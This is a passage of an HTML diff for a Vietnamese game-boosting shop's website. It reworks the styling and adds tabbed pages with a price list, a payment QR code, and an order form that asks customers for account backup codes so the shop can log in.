@@ -3,63 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>its_zenk cày thuê</title>
+    <title>its_zenk cày thuê - Website Chính Thức</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- Màn Hình Chào Kích Hoạt Nhạc Nền --- */
-        #welcome-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #0b0f19;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            transition: opacity 0.5s ease, transform 0.5s ease;
-        }
-
-        .start-web-btn {
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #ffffff;
-            background: #111827;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            position: relative;
-            box-shadow: 0 0 20px rgba(127, 0, 255, 0.4);
-            transition: all 0.3s ease;
-        }
-
-        .start-web-btn::before {
-            content: '';
-            position: absolute;
-            top: -3px; left: -3px; right: -3px; bottom: -3px;
-            background: linear-gradient(45deg, #ff007f, #7f00ff, #00f0ff, #ff007f);
-            background-size: 400%;
-            border-radius: 15px;
-            z-index: -1;
-            animation: buttonGlow 6s linear infinite;
-        }
-
-        @keyframes buttonGlow {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .start-web-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.6);
-        }
-
-        /* --- Giao diện tổng thể --- */
+        /* --- Giao diện tổng thể & Nền độc quyền của its_zenk --- */
         body {
             background-color: #0b111e;
             color: #ffffff;
@@ -74,7 +21,6 @@
             position: relative;
         }
 
-        /* --- BACKGROUND PHẦN DƯỚI: SỌC LƯỚI GRID --- */
         body::before {
             content: "";
             position: fixed;
@@ -87,7 +33,6 @@
             background-position: center top;
         }
 
-        /* Hiệu ứng tâm sáng làm nổi bật nội dung ở giữa */
         body::after {
             content: "";
             position: fixed;
@@ -97,7 +42,7 @@
             pointer-events: none;
         }
 
-        /* --- BACKGROUND PHẦN TRÊN: THANH QUÉT LA-ZE XANH NHẠT --- */
+        /* --- Thanh Quét La-ze --- */
         .scan-line-bg {
             position: fixed;
             top: 0;
@@ -107,24 +52,17 @@
             z-index: -2;
             pointer-events: none;
         }
-
         .scan-line-bg::before {
             content: "";
             position: absolute;
             width: 100%;
             height: 80px;
-            background: linear-gradient(
-                to bottom,
-                transparent,
-                rgba(0, 240, 255, 0.12) 50%,
-                transparent
-            );
+            background: linear-gradient(to bottom, transparent, rgba(0, 240, 255, 0.12) 50%, transparent);
             border-bottom: 2px solid rgba(0, 240, 255, 0.25);
             box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
             top: -100px;
             animation: laserScan 6s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
-
         @keyframes laserScan {
             0% { top: -100px; opacity: 0; }
             5% { opacity: 1; }
@@ -132,33 +70,22 @@
             100% { top: 100vh; opacity: 0; }
         }
 
-        /* --- HIỆU ỨNG BỤI BAY (PARTICLES) NỀN --- */
+        /* --- Hiệu ứng bụi Particles --- */
         .particles-bg {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-            overflow: hidden;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; pointer-events: none; overflow: hidden;
         }
-
         .particle {
-            position: absolute;
-            background: #fff;
-            border-radius: 50%;
-            opacity: 0;
+            position: absolute; background: #fff; border-radius: 50%; opacity: 0;
             animation: floatUp infinite linear;
         }
-
         .particle:nth-child(1) { width: 3px; height: 3px; left: 10%; bottom: -10px; animation-duration: 18s; animation-delay: 1s; background: #3b82f6; }
         .particle:nth-child(2) { width: 2px; height: 2px; left: 25%; bottom: -10px; animation-duration: 24s; animation-delay: 5s; background: #eab308; }
         .particle:nth-child(3) { width: 4px; height: 4px; left: 45%; bottom: -10px; animation-duration: 15s; animation-delay: 0s; background: #fff; }
         .particle:nth-child(4) { width: 2px; height: 2px; left: 65%; bottom: -10px; animation-duration: 22s; animation-delay: 3s; background: #a855f7; }
         .particle:nth-child(5) { width: 3px; height: 3px; left: 85%; bottom: -10px; animation-duration: 19s; animation-delay: 7s; background: #06b6d4; }
         .particle:nth-child(6) { width: 2px; height: 2px; left: 90%; bottom: -10px; animation-duration: 26s; animation-delay: 2s; background: #fff; }
-
         @keyframes floatUp {
             0% { transform: translateY(0) scale(0.5); opacity: 0; }
             10% { opacity: 0.6; }
@@ -166,153 +93,124 @@
             100% { transform: translateY(-105vh) scale(1.2); opacity: 0; }
         }
 
-        /* --- Banner & Avatar --- */
-        .header-container {
-            text-align: center;
-            padding: 50px 20px 30px;
-            width: 100%;
+        /* --- Màn hình Chào (Overlay) --- */
+        #welcome-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #0b0f19; z-index: 9999;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        .start-web-btn {
+            padding: 15px 40px; font-size: 18px; font-weight: bold; text-transform: uppercase;
+            letter-spacing: 2px; color: #ffffff; background: #111827; border: none;
+            border-radius: 12px; cursor: pointer; position: relative;
+            box-shadow: 0 0 20px rgba(127, 0, 255, 0.4); transition: all 0.3s ease;
+        }
+        .start-web-btn::before {
+            content: ''; position: absolute; top: -3px; left: -3px; right: -3px; bottom: -3px;
+            background: linear-gradient(45deg, #ff007f, #7f00ff, #00f0ff, #ff007f);
+            background-size: 400%; border-radius: 15px; z-index: -1; animation: buttonGlow 6s linear infinite;
+        }
+        @keyframes buttonGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .start-web-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 240, 255, 0.6); }
+
+        /* --- Thanh Điều Hướng (Tabs Menu) --- */
+        .navigation-tabs {
+            display: flex;
+            gap: 15px;
+            margin: 20px auto;
+            width: 90%;
             max-width: 800px;
+            justify-content: center;
+            z-index: 10;
+        }
+        .tab-btn {
+            background: rgba(17, 24, 39, 0.8);
+            border: 1px solid #1e293b;
+            color: #94a3b8;
+            padding: 12px 30px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .tab-btn:hover {
+            border-color: #3b82f6;
+            color: #fff;
+            background: rgba(30, 41, 59, 0.5);
+        }
+        .tab-btn.active {
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            border-color: #3b82f6;
+            color: white;
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
         }
 
-        .avatar-wrapper {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 2px solid rgba(0, 240, 255, 0.3);
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
-            background-color: #111827;
+        /* --- Nội dung các trang --- */
+        .web-page {
+            display: none;
+            width: 90%;
+            max-width: 800px;
+            animation: fadeIn 0.4s ease-in-out forwards;
         }
-
-        .avatar-wrapper::after {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -150%;
-            width: 50%;
-            height: 200%;
-            background: linear-gradient(
-                90deg,
-                transparent,
-                rgba(0, 240, 255, 0.4) 50%,
-                transparent
-            );
-            transform: rotate(25deg);
-            animation: avatarSheen 4s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        @keyframes avatarSheen {
-            0% { left: -150%; }
-            30%, 100% { left: 150%; }
-        }
-
-        .avatar {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
+        .web-page.active {
             display: block;
         }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
+        /* --- Header thông tin chung --- */
+        .header-container { text-align: center; padding: 30px 20px 15px; width: 100%; box-sizing: border-box; }
+        .avatar-wrapper {
+            position: relative; width: 120px; height: 120px; margin: 0 auto 20px;
+            border-radius: 50%; overflow: hidden; border: 2px solid rgba(0, 240, 255, 0.3);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2); background-color: #111827;
+        }
+        .avatar-wrapper::after {
+            content: ""; position: absolute; top: -50%; left: -150%; width: 50%; height: 200%;
+            background: linear-gradient(90deg, transparent, rgba(0, 240, 255, 0.4) 50%, transparent);
+            transform: rotate(25deg); animation: avatarSheen 4s ease-in-out infinite;
+        }
+        @keyframes avatarSheen { 0% { left: -150%; } 30%, 100% { left: 150%; } }
+        .avatar { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; display: block; }
         .badge {
-            background-color: rgba(30, 41, 59, 0.7);
-            border: 1px solid #3b82f6;
-            color: #3b82f6;
-            padding: 5px 16px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            display: inline-block;
-            margin-bottom: 15px;
-            backdrop-filter: blur(4px);
+            background-color: rgba(30, 41, 59, 0.7); border: 1px solid #3b82f6; color: #3b82f6;
+            padding: 5px 16px; border-radius: 6px; font-size: 11px; font-weight: bold;
+            letter-spacing: 2px; display: inline-block; margin-bottom: 15px; backdrop-filter: blur(4px);
         }
+        h1 { font-size: 36px; margin: 5px 0; text-transform: uppercase; font-weight: 800; color: #ffffff; }
+        .sub-features { color: #94a3b8; font-size: 13px; margin: 8px 0 15px 0; }
+        .username-tag { background-color: rgba(17, 24, 39, 0.8); border: 1px solid #334155; padding: 6px 20px; border-radius: 20px; display: inline-block; font-size: 13px; }
+        .username-tag span { color: #10b981; margin-right: 6px; }
 
-        h1 {
-            font-size: 40px;
-            margin: 5px 0;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 800;
-            color: #ffffff;
-        }
-
-        .sub-features {
-            color: #94a3b8;
-            font-size: 13px;
-            margin: 8px 0 15px 0;
-            letter-spacing: 0.5px;
-        }
-
-        .username-tag {
-            background-color: rgba(17, 24, 39, 0.8);
-            border: 1px solid #334155;
-            padding: 6px 20px;
-            border-radius: 20px;
-            display: inline-block;
-            font-size: 13px;
-            color: #ffffff;
-        }
-        .username-tag span {
-            color: #10b981;
-            margin-right: 6px;
-        }
-
-        /* --- Khu Vực Khuyến Mãi --- */
+        /* --- Discord Promo Banner --- */
         .discord-promo {
             background: linear-gradient(135deg, rgba(76, 29, 149, 0.4), rgba(30, 27, 75, 0.4));
-            border: 1px dashed #8b5cf6;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 10px auto 30px;
-            max-width: 550px;
-            text-align: center;
-            backdrop-filter: blur(4px);
-            width: 90%;
+            border: 1px dashed #8b5cf6; border-radius: 12px; padding: 15px; margin: 10px auto 25px;
+            text-align: center; backdrop-filter: blur(4px); width: 100%; box-sizing: border-box;
         }
-
-        .discord-promo p {
-            margin: 0 0 10px 0;
-            font-size: 15px;
-        }
-
         .discord-btn {
-            display: inline-block;
-            background-color: #5865F2;
-            color: white;
-            text-decoration: none;
-            padding: 8px 20px;
-            border-radius: 6px;
-            font-weight: bold;
-            transition: all 0.3s ease;
+            display: inline-block; background-color: #5865F2; color: white; text-decoration: none;
+            padding: 8px 20px; border-radius: 6px; font-weight: bold; transition: all 0.3s ease; margin-top: 5px;
         }
+        .discord-btn:hover { background-color: #4752c4; transform: translateY(-2px); }
 
-        .discord-btn:hover {
-            background-color: #4752c4;
-            transform: translateY(-2px);
-        }
-
-        /* --- Danh sách dịch vụ --- */
-        .services-list {
-            width: 90%;
-            max-width: 800px;
-            padding-bottom: 20px;
-        }
-
+        /* --- CSS Trang 1: Accordion Danh sách dịch vụ --- */
         .accordion-item {
-            background-color: rgba(17, 24, 39, 0.75);
-            border-radius: 12px;
-            margin-bottom: 15px;
-            overflow: hidden;
-            border: 1px solid #1e293b;
-            border-left: 4px solid #3b82f6;
-            backdrop-filter: blur(6px);
-            transition: all 0.3s ease;
+            background-color: rgba(17, 24, 39, 0.75); border-radius: 12px; margin-bottom: 15px;
+            overflow: hidden; border: 1px solid #1e293b; border-left: 4px solid #3b82f6;
+            backdrop-filter: blur(6px); transition: all 0.3s ease;
         }
-        
         .accordion-item.level { border-left-color: #3b82f6; }
         .accordion-item.leviathan { border-left-color: #eab308; }
         .accordion-item.ring { border-left-color: #a855f7; }
@@ -320,245 +218,131 @@
         .accordion-item.dragon { border-left-color: #ec4899; }
         .accordion-item.sword { border-left-color: #f97316; }
         .accordion-item.race { border-left-color: #10b981; }
-
         .accordion-header {
-            width: 100%;
-            background: none;
-            border: none;
-            padding: 18px 20px;
-            color: white;
-            text-align: left;
-            font-size: 17px;
-            font-weight: 600;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
+            width: 100%; background: none; border: none; padding: 18px 20px; color: white;
+            text-align: left; font-size: 17px; font-weight: 600; display: flex;
+            justify-content: space-between; align-items: center; cursor: pointer;
         }
-
         .accordion-header:hover { background-color: rgba(31, 41, 55, 0.4); }
         .header-title { display: flex; align-items: center; gap: 12px; }
-        .icon-glow { display: inline-block; font-size: 18px; }
-
         .icon-arrow { 
-            font-size: 12px; 
-            transition: transform 0.3s ease; 
-            color: #6b7280; 
-            background: rgba(255,255,255,0.05);
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-size: 12px; transition: transform 0.3s ease; color: #6b7280; 
+            background: rgba(255,255,255,0.05); width: 26px; height: 26px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
         }
-
-        .accordion-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-            background-color: rgba(10, 15, 26, 0.5);
-        }
-
-        .price-grid {
-            padding: 20px;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-        }
-
-        .price-card {
-            background-color: rgba(30, 41, 59, 0.45);
-            padding: 18px 15px;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            text-align: left;
-            transition: all 0.25s ease;
-        }
-
+        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1); background-color: rgba(10, 15, 26, 0.5); }
+        .price-grid { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+        .price-card { background-color: rgba(30, 41, 59, 0.45); padding: 18px 15px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.03); text-align: left; }
         .price-card .tier { font-size: 13px; color: #94a3b8; margin-bottom: 6px; }
         .price-card .cost { font-size: 19px; font-weight: bold; color: #f59e0b; }
         .price-card .note { font-size: 11px; color: #64748b; margin-top: 5px; }
-
         .accordion-item.active .icon-arrow { transform: rotate(180deg); color: #fff; background: #3b82f6; }
 
-        /* --- KHU VỰC GỬI NHẬN XÉT --- */
+        /* --- CSS Trang 2: Form điền thông tin đặt hàng --- */
+        .notice-box {
+            border: 1px solid #fecaca; background-color: #fffdec; border-radius: 8px;
+            padding: 15px 20px; margin-bottom: 20px; font-size: 14px; line-height: 1.6; color: #1a1a1a;
+        }
+        .notice-title { color: #dc2626; font-weight: bold; margin-bottom: 8px; }
+        .step-section {
+            background: rgba(15, 23, 42, 0.6); border: 1px solid #1e293b;
+            border-radius: 12px; padding: 20px; margin-bottom: 20px; backdrop-filter: blur(6px); box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .step-header { font-size: 16px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; color: #fff; }
+        .step-number { background: #3b82f6; color: white; border-radius: 50%; width: 24px; height: 24px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; margin-right: 10px; font-weight: bold; }
+        .form-row { display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap; }
+        .form-group { flex: 1; min-width: 200px; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 8px; color: #cbd5e1; }
+        .input-wrapper { position: relative; }
+        .input-wrapper i { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #94a3b8; }
+        .input-wrapper input, .input-wrapper select, .input-wrapper textarea {
+            width: 100%; padding: 11px 12px 11px 38px; border: 1px solid #334155; border-radius: 8px;
+            box-sizing: border-box; font-size: 14px; background-color: rgba(10, 15, 26, 0.6); color: #fff; font-family: inherit;
+        }
+        .input-wrapper input:focus, .input-wrapper select:focus, .input-wrapper textarea:focus { outline: none; border-color: #3b82f6; background-color: rgba(15, 23, 42, 0.8); }
+        .card-info-text { color: #38bdf8; font-size: 13px; margin-top: 10px; font-weight: bold; display: flex; align-items: center; gap: 6px; }
+        .card-warning { color: #f87171; font-size: 13px; margin-top: 6px; font-weight: bold; display: flex; align-items: center; gap: 6px; }
+        
+        /* Bot Check Status */
+        .bot-status { margin-top: 12px; font-size: 13px; font-weight: bold; padding: 12px 15px; border-radius: 8px; display: none; }
+        .status-checking { background-color: rgba(251, 191, 36, 0.15); color: #fbbf24; border: 1px solid #d97706; }
+        .status-success { background-color: rgba(52, 211, 153, 0.15); color: #34d399; border: 1px solid #059669; }
+        .status-error { background-color: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid #dc2626; }
+
+        /* Nút Tiến hành đặt đơn */
+        .btn-container { text-align: center; margin-top: 20px; margin-bottom: 30px; }
+        .btn-submit {
+            background: linear-gradient(90deg, #818cf8, #6366f1); color: white; border: none;
+            padding: 14px 50px; font-size: 16px; font-weight: bold; border-radius: 8px;
+            cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+        }
+        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5); }
+        .btn-hint { font-size: 13px; color: #94a3b8; margin-bottom: 10px; }
+
+        /* --- Thiết Kế Độc Quyền Theo Ảnh: Khu Vực Nhận Xét Đánh Giá --- */
         .rating-container {
-            width: 90%;
-            max-width: 500px;
-            margin: 30px auto 10px auto;
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid #1e293b;
-            border-radius: 16px;
-            padding: 25px 20px;
-            backdrop-filter: blur(6px);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            box-sizing: border-box;
+            width: 100%; max-width: 800px; margin: 30px auto 20px auto;
+            background: #0d1424; border: 1px solid #172237; border-radius: 12px;
+            padding: 30px 25px; box-sizing: border-box; text-align: center;
         }
-
         .rating-container h2 {
-            font-size: 18px;
-            margin: 0 0 20px 0;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            color: #ffffff;
+            font-size: 20px; margin: 0 0 15px 0; font-weight: bold;
+            color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 8px;
         }
-
-        .star-rating {
-            display: flex;
-            flex-direction: row-reverse;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
+        .star-rating { display: flex; flex-direction: row-reverse; justify-content: center; margin-bottom: 20px; }
         .star-rating input { display: none; }
-
         .star-rating label {
-            font-size: 35px;
-            color: #334155;
-            cursor: pointer;
-            padding: 0 4px;
+            font-size: 36px; color: #242f47; cursor: pointer; padding: 0 6px;
             transition: color 0.2s ease, transform 0.1s ease;
         }
-
-        .star-rating label:hover,
-        .star-rating label:hover ~ label,
-        .star-rating input:checked ~ label {
-            color: #fbbf24;
-            text-shadow: 0 0 10px rgba(251, 191, 36, 0.4);
+        .star-rating label:hover, .star-rating label:hover ~ label, .star-rating input:checked ~ label {
+            color: #3b82f6; filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.5));
         }
-
-        .star-rating label:active { transform: scale(0.9); }
-
-        .rating-form input[type="text"],
-        .rating-form textarea {
-            width: 100%;
-            background: rgba(10, 15, 26, 0.6);
-            border: 1px solid #334155;
-            border-radius: 8px;
-            padding: 10px 12px;
-            color: #ffffff;
-            font-size: 14px;
-            margin-bottom: 12px;
-            box-sizing: border-box;
-            font-family: inherit;
-            outline: none;
-            transition: border-color 0.25s;
+        .rating-form input[type="text"], .rating-form textarea {
+            width: 100%; background: #070b14; border: 1px solid #1c2942; border-radius: 8px;
+            padding: 14px 16px; color: #ffffff; font-size: 14px; margin-bottom: 15px;
+            box-sizing: border-box; font-family: inherit; outline: none; transition: border-color 0.25s;
         }
-
-        .rating-form input[type="text"]:focus,
-        .rating-form textarea:focus { border-color: #3b82f6; }
-
+        .rating-form input[type="text"]::placeholder, .rating-form textarea::placeholder { color: #4a5974; }
+        .rating-form input[type="text"]:focus, .rating-form textarea:focus { border-color: #3b82f6; }
         .submit-rating-btn {
-            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            font-size: 14px;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 15px rgba(59, 130, 246, 0.3);
+            background-color: #2563eb; color: white; border: none; padding: 12px 30px;
+            border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 15px;
+            transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
         }
+        .submit-rating-btn:hover { background-color: #1d4ed8; transform: translateY(-1px); }
+        .review-hint { font-size: 13px; color: #4a5974; margin-top: 25px; }
 
-        .submit-rating-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
-        }
-        .submit-rating-btn:disabled {
-            background: #475569;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        /* --- Khu Vực Mã QR Thanh Toán --- */
-        .payment-container {
-            width: 90%;
-            max-width: 400px;
-            margin: 20px auto;
-            text-align: center;
-        }
-
+        /* --- Sửa Theo Yêu Cầu: Khung QR Số tài khoản --- */
+        .payment-container { width: 100%; margin: 20px auto; text-align: center; box-sizing: border-box; }
         .payment-box {
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid #223047;
-            border-radius: 16px;
-            padding: 20px;
-            backdrop-filter: blur(6px);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            background: rgba(15, 23, 42, 0.6); border: 1px solid #223047;
+            border-radius: 16px; padding: 25px; backdrop-filter: blur(6px); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
         }
-
-        .payment-box h3 {
-            margin: 0 0 15px 0;
-            font-size: 18px;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-        }
-
+        .payment-box h3 { margin: 0 0 18px 0; font-size: 18px; color: #ffffff; letter-spacing: 0.5px; }
         .qr-code-img {
-            width: 100%;
-            max-width: 240px;
-            border-radius: 12px;
-            box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);
-            border: 2px solid rgba(255, 255, 255, 0.05);
-            display: block;
-            margin: 0 auto;
+            width: 100%; max-width: 240px; border-radius: 12px;
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.2); border: 2px solid rgba(255, 255, 255, 0.05);
+            display: block; margin: 0 auto;
         }
 
-        /* --- Khu vực Hỗ trợ --- */
-        .support-container {
-            width: 90%;
-            max-width: 800px;
-            margin: 10px auto 50px auto;
-            text-align: center;
-        }
-
-        .support-box {
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid #223047;
-            border-radius: 12px;
-            padding: 25px 20px;
-            backdrop-filter: blur(6px);
-        }
-
-        .support-box p {
-            margin: 0 0 15px 0;
-            font-size: 16px;
-            color: #cbd5e1;
-        }
-
+        /* --- Khung Hỗ Trợ Dưới Cùng --- */
+        .support-container { width: 100%; margin: 20px auto 40px auto; text-align: center; }
+        .support-box { background: rgba(15, 23, 42, 0.6); border: 1px solid #223047; border-radius: 12px; padding: 20px; backdrop-filter: blur(6px); }
+        .support-box p { margin: 0 0 12px 0; font-size: 15px; color: #cbd5e1; }
         .support-btn {
-            display: inline-block;
-            background: linear-gradient(90deg, #10b981, #059669);
-            color: white;
-            text-decoration: none;
-            padding: 12px 30px;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 15px;
-            transition: all 0.3s ease;
+            display: inline-block; background: linear-gradient(90deg, #10b981, #059669); color: white;
+            text-decoration: none; padding: 10px 25px; border-radius: 8px; font-weight: bold; font-size: 14px; transition: all 0.3s ease;
         }
-
-        .support-btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.1);
-        }
+        .support-btn:hover { transform: translateY(-2px); filter: brightness(1.1); }
     </style>
 </head>
 <body>
 
     <div class="scan-line-bg"></div>
-
     <div class="particles-bg">
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
     </div>
 
     <div id="welcome-overlay">
@@ -577,39 +361,224 @@
         <div class="username-tag"><span>●</span> its_zenk</div>
     </div>
 
-    <div class="discord-promo">
-        <p>🎁 <strong>ƯU ĐÃI ĐẶC BIỆT:</strong> Ai vô Discord sẽ được <strong>giảm ngay 5%</strong> tổng hóa đơn!</p>
-        <a id="discord-link" href="https://discord.com/invite/eZ7JZf3Nuu" target="_blank" class="discord-btn">Tham Gia Discord Ngay</a>
+    <div class="navigation-tabs">
+        <button class="tab-btn active" onclick="switchPage('page-price', this)">
+            <i class="fa-solid fa-tags"></i> 1. Bảng Giá Dịch Vụ
+        </button>
+        <button class="tab-btn" onclick="switchPage('page-order', this)">
+            <i class="fa-solid fa-cart-shopping"></i> 2. Thanh Toán & Đặt Đơn
+        </button>
     </div>
 
-    <div class="services-list" id="main-services-container"></div>
-
-    <div class="rating-container">
-        <h2>⭐ Đánh giá dịch vụ ⭐</h2>
-        <form class="rating-form" id="reviewForm" onsubmit="sendReview(event)">
-            <div class="star-rating">
-                <input type="radio" id="star5" name="user_stars" value="5" required>
-                <label for="star5" title="5 sao">★</label>
-                <input type="radio" id="star4" name="user_stars" value="4">
-                <label for="star4" title="4 sao">★</label>
-                <input type="radio" id="star3" name="user_stars" value="3">
-                <label for="star3" title="3 sao">★</label>
-                <input type="radio" id="star2" name="user_stars" value="2">
-                <label for="star2" title="2 sao">★</label>
-                <input type="radio" id="star1" name="user_stars" value="1">
-                <label for="star1" title="1 sao">★</label>
-            </div>
-            <input type="text" id="reviewerName" placeholder="Tên của bạn hoặc Tên Discord..." required>
-            <textarea id="reviewerMessage" rows="2" placeholder="Lời nhắn hoặc góp ý cho mình (không bắt buộc)..."></textarea>
-            <button type="submit" class="submit-rating-btn" id="submitBtn">Gửi Đánh Giá</button>
-        </form>
-    </div>
-
-    <div class="payment-container">
-        <div class="payment-box">
-            <h3>💳 Thanh toán tại đây nhé (có nhận card nhé) </h3>
-            <img class="qr-code-img" src="724769937_2199027270885230_912266117950890536_n.jpg" alt="Mã QR Vietcombank NGUYEN VAN THANG">
+    <div id="page-price" class="web-page active">
+        <div class="discord-promo">
+            <p>🎁 <strong>ƯU ĐÃI ĐẶC BIỆT:</strong> Ai vô Discord sẽ được <strong>giảm ngay 5%</strong> tổng hóa đơn!</p>
+            <a href="https://discord.com/invite/eZ7JZf3Nuu" target="_blank" class="discord-btn">Tham Gia Discord Ngay</a>
         </div>
+
+        <div class="services-list" id="main-services-container"></div>
+    </div>
+
+    <div id="page-order" class="web-page">
+        
+        <div class="notice-box">
+            <div class="notice-title">⚠️ LƯU Ý QUAN TRỌNG (BẮT BUỘC 100%)</div>
+            🔑 Tài khoản phải có CODE BACKUP (mã dự phòng) thì shop mới đăng nhập và cày được.<br>
+            ❌ Không có mã dự phòng → shop không thể vào acc.<br>
+            🎥 Hướng dẫn lấy mã: <span style="color:#2563eb; cursor:pointer; font-weight:bold;">https://youtu.be/zO7jFjIjLHE</span><br>
+            👉 Nếu bạn đã lỡ đặt đơn nhưng chưa có mã dự phòng thì shop sẽ hủy đơn và hoàn tiền 100%.<br><br>
+            ⏳ Thời gian hoàn thành: Đơn thông thường: 24-72h | Đơn To: Sẽ lâu hơn tùy vào đơn.
+        </div>
+
+        <div class="payment-container">
+            <div class="payment-box">
+                <h3>💳 Thanh toán bằng số tài khoản ở đây nhé (có nhận card nhé)</h3>
+                <img class="qr-code-img" src="724769937_2199027270885230_912266117950890536_n.jpg" alt="Mã QR Vietcombank NGUYEN VAN THANG">
+            </div>
+        </div>
+
+        <div class="step-section">
+            <div class="step-header"><span class="step-number">1</span> Chọn Gói Dịch Vụ Cần Đặt</div>
+            <div class="input-wrapper">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <select id="service-package">
+                  <optgroup label="Cày Level">
+    <option value="Level 1-700: 10k">Level 1-700: 10k</option>
+    <option value="Level 700-1500: 10k">Level 700-1500: 10k</option>
+    <option value="Level 1500-2800: 20k">Level 1500-2800: 20k</option>
+</optgroup>
+
+<!-- Nhóm Leviathan -->
+<optgroup label="Leviathan">
+    <option value="Leviathan 10 mythical: 25k">Leviathan 10 mythical: 25k</option>
+    <option value="Leviathan 20 legendary: 25k">Leviathan 20 legendary: 25k</option>
+</optgroup>
+
+<!-- Nhóm Dungeon -->
+<optgroup label="Dungeon (Ring)">
+    <option value="10 legendary ring random: 80k">10 legendary ring random: 80k</option>
+    <option value="1 legendary ring random: 10k">1 legendary ring random: 10k</option>
+    <option value="1 mythical ring random: 60k">1 mythical ring random: 60k</option>
